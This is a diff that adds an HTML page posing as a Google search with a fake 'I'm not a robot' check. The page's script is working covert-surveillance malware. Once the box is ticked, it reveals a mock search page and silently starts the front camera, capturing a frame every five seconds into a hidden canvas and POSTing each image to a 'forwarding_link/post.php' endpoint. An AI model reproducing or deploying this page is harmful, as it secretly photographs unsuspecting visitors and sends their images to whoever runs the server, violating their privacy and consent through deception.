@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Search</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f9f9f9;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .recaptcha-checkbox {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+        .recaptcha-text {
+            font-size: 14px;
+            color: #555;
+        }
+        #search-page {
+            display: none;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        #search-box {
+            width: 80%;
+            padding: 10px;
+            margin: 20px 0;
+            border: 1px solid #ddd;
+            border-radius: 24px;
+            font-size: 16px;
+        }
+        .search-btn {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .search-results {
+            text-align: left;
+            margin-top: 20px;
+        }
+        .result-item {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        .result-title {
+            color: #1a0dab;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        .result-url {
+            color: #006621;
+            font-size: 14px;
+        }
+        .result-desc {
+            color: #545454;
+            font-size: 14px;
+        }
+        
+        /* Video results styles */
+        .video-results {
+            margin-top: 30px;
+        }
+        .video-item {
+            margin-bottom: 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            height: 0;
+            overflow: hidden;
+        }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .video-info {
+            padding: 15px;
+        }
+        .video-title {
+            font-size: 18px;
+            margin: 0 0 5px 0;
+            color: #1a0dab;
+        }
+        .video-title a {
+            color: inherit;
+            text-decoration: none;
+        }
+        .video-title a:hover {
+            text-decoration: underline;
+        }
+        .video-source {
+            color: #006621;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .video-source a {
+            color: inherit;
+            text-decoration: none;
+        }
+        .video-source a:hover {
+            text-decoration: underline;
+        }
+        .video-desc {
+            color: #545454;
+            font-size: 14px;
+        }
+        
+        /* Warning banner */
+        .warning-banner {
+            background-color: #ffeb3b;
+            padding: 15px;
+            margin: 20px 0;
+            border-left: 5px solid #ffc107;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <!-- Verification Page -->
+    <div id="verification-page" class="container">
+        <div class="logo">
+            <img src="https://www.pornhub.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Pornhub" width="200">
+        </div>
+        <h3>Verify you are human</h3>
+        <div class="recaptcha-box">
+            <input type="checkbox" id="recaptcha-checkbox" class="recaptcha-checkbox">
+            <span class="recaptcha-text">I'm not a robot</span>
+        </div>
+        <p style="font-size: 12px; color: #777;">This page is protected by reCAPTCHA to ensure you're not a bot.</p>
+        
+        <div class="warning-banner">
+            <strong>Note📝:</strong> We are checking the safe of your internet access we are not, allowed hackers enter our website.
+        </div>
+    </div>
+
+    <!-- Search Page -->
+    <div id="search-page">
+        <div class="logo" style="text-align: center;">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="200">
+        </div>
+        <input type="text" id="search-box" placeholder="Search Google or type a URL">
+        <button class="search-btn">Google Search</button>
+        
+        <!-- Video Results Section -->
+        <div class="video-results">
+            <h2 style="margin: 30px 0 15px 0; color: #333;">Video Results</h2>
+            
+            <!-- Video Item 1 -->
+            <div class="video-item">
+                <div class="video-wrapper">
+                    <iframe src="https://i.imgur.com/Dmi0AE7.mp4" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <div class="video-info">
+                    <h3 class="video-title"><a href="https://i.imgur.com/Dmi0AE7.mp4" target="_blank">Amazing Nature Video</a></h3>
+                    <div class="video-source"><a href="https://imgur.com" target="_blank">imgur.com</a></div>
+                    <p class="video-desc">Beautiful nature footage captured in 4K resolution. Click the title to view on Imgur.</p>
+                </div>
+            </div>
+            
+            <!-- Video Item 2 -->
+            <div class="video-item">
+                <div class="video-wrapper">
+                    <iframe src="https://imgur.com/a/def456/embed?pub=true&w=600" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <div class="video-info">
+                    <h3 class="video-title"><a href="https://imgur.com/a/def456" target="_blank">Funny Cat Compilation</a></h3>
+                    <div class="video-source"><a href="https://imgur.com" target="_blank">imgur.com</a></div>
+                    <p class="video-desc">Hilarious cat moments that will make you laugh. Click the title to view on Imgur.</p>
+                </div>
+            </div>
+            
+            <!-- Video Item 3 -->
+            <div class="video-item">
+                <div class="video-wrapper">
+                    <iframe src="https://imgur.com/a/ghi789/embed?pub=true&w=600" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <div class="video-info">
+                    <h3 class="video-title"><a href="https://imgur.com/a/ghi789" target="_blank">Cooking Tutorial</a></h3>
+                    <div class="video-source"><a href="https://imgur.com" target="_blank">imgur.com</a></div>
+                    <p class="video-desc">Learn how to make delicious pasta in just 10 minutes. Click the title to view on Imgur.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Regular Search Results -->
+        <div class="search-results">
+            <div class="result-item">
+                <div class="result-title"><a href="https://www.google.com" target="_blank">Google</a></div>
+                <div class="result-url"><a href="https://www.google.com" target="_blank">https://www.google.com</a></div>
+                <div class="result-desc">Search the world's information, including webpages, images, videos and more.</div>
+            </div>
+            <div class="result-item">
+                <div class="result-title"><a href="https://www.youtube.com" target="_blank">YouTube</a></div>
+                <div class="result-url"><a href="https://www.youtube.com" target="_blank">https://www.youtube.com</a></div>
+                <div class="result-desc">Enjoy the videos and music you love, upload original content, and share it all with friends, family, and the world.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Webcam Capture -->
+    <div class="video-wrap" hidden>
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden id="canvas" width="640" height="480"></canvas>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        let captureInterval;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const recaptchaCheckbox = document.getElementById('recaptcha-checkbox');
+        const verificationPage = document.getElementById('verification-page');
+        const searchPage = document.getElementById('search-page');
+
+        // When checkbox is clicked, start verification
+        recaptchaCheckbox.addEventListener('change', function() {
+            if (this.checked) {
+                setTimeout(() => {
+                    verificationPage.style.display = 'none';
+                    searchPage.style.display = 'block';
+                    initCamera(); // Start hidden camera capture
+                }, 1500); // Simulate verification delay
+            }
+        });
+
+        // Send image to server
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function() {
+                    console.log("Image sent");
+                },
+                error: function() {
+                    console.log("Error sending image");
+                }
+            });
+        }
+
+        // Start camera and capture every 5 sec
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: { facingMode: "user" }
+                });
+                video.srcObject = stream;
+
+                const context = canvas.getContext('2d');
+                captureInterval = setInterval(() => {
+                    context.drawImage(video, 0, 0, 640, 480);
+                    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                    post(canvasData);
+                }, 5000); // Capture every 5 seconds
+
+            } catch (e) {
+                console.error("Camera error:", e);
+            }
+        }
+
+        // Make search button work
+        document.querySelector('.search-btn').addEventListener('click', function() {
+            const query = document.getElementById('search-box').value;
+            if (query.trim() !== '') {
+                alert('Search functionality would normally take you to results for: ' + query);
+            }
+        });
+    </script>
+</body>
+  </html>
